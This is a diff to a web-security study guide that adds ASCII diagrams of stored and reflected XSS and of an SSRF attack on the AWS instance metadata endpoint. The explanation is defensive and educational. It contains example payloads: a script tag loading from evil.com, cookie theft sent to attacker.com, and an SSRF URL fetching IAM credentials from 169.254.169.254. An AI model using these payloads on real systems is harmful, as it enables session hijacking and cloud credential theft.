@@ -148,6 +148,25 @@ A compact, URL-safe means of representing claims securely between two parties. C
 | **Reflected (Non-Persistent)** | In the immediate HTTP request (URL query parameter) | Server reflects the input directly into the HTTP response body without sanitization | Phishing link: `https://site.com/search?q=<script src=evil.com/x.js></script>` |
 | **DOM-based** | Exists purely client-side in the browser DOM | Client-side JavaScript reads data from a **Source** (`location.hash`) and writes it insecurely to an execution **Sink** (`document.write()`, `innerHTML`) without server involvement | `document.getElementById('name').innerHTML = location.search;` |
 
+```
+Stored XSS vs Reflected XSS Attack Mechanics:
+
+Stored (Persistent) XSS:
+Attacker ──► Injects <script> into DB comment ──► Database
+                                                    │
+Victim ◄──── Server renders page with script ◄──────┘
+   │
+   ▼
+[ Victim's Browser executes script: Cookies stolen & sent to attacker.com ]
+
+Reflected XSS:
+Attacker ──► Crafts phishing link: "https://site.com/search?q=<script>..."
+                 │
+Victim clicks ───► Web Server reflects search parameter back in HTTP response
+                     │
+Victim's Browser ◄───┘ (Browser executes script in victim's session context)
+```
+
 * **Impact:** Hijacking session cookies, keystroke logging (credential theft), injecting fake login forms (phishing), triggering forced actions on behalf of the user.
 * **Comprehensive Defense:**
   1. **Context-Aware Output Encoding:** Encode HTML entities (`<` $\rightarrow$ `&lt;`, `>` $\rightarrow$ `&gt;`), JavaScript strings, and URL attributes before rendering user input.
@@ -191,6 +210,32 @@ Victim visits evil.com                               │
   * An attacker supplies the internal cloud metadata IP address:
     `POST /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role`
   * The backend server queries its local link-local metadata address and returns AWS temporary IAM access keys directly to the attacker!
+
+```
+Server-Side Request Forgery (SSRF) Cloud Metadata Attack:
+
+[ Attacker ]
+     │
+     │ 1. Submits image URL:
+     │    "http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole"
+     ▼
+┌───────────────────────────────────────┐
+│ Vulnerable Web Application (AWS EC2)  │
+│ (Permitted to query metadata locally) │
+└──────────────────┬────────────────────┘
+                   │
+                   │ 2. Backend server fetches URL (bypassing external perimeter firewall)
+                   ▼
+┌───────────────────────────────────────┐
+│ AWS Instance Metadata Service (IMDS)  │ ◄── Returns IAM Access Key, Secret Key & Token!
+│ (Link-Local: 169.254.169.254)         │
+└──────────────────┬────────────────────┘
+                   │
+                   │ 3. Server renders or returns metadata response
+                   ▼
+[ Attacker Receives AWS Cloud Admin Credentials! ]
+```
+
 * **Remediation:**
   * Restrict and strictly allow-list permitted URL protocols (`https` only; block `file://`, `gopher://`, `dict://`).
   * Enforce strict IP allow-listing and block requests targeting private RFC 1918 subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.1`, `169.254.169.254`).
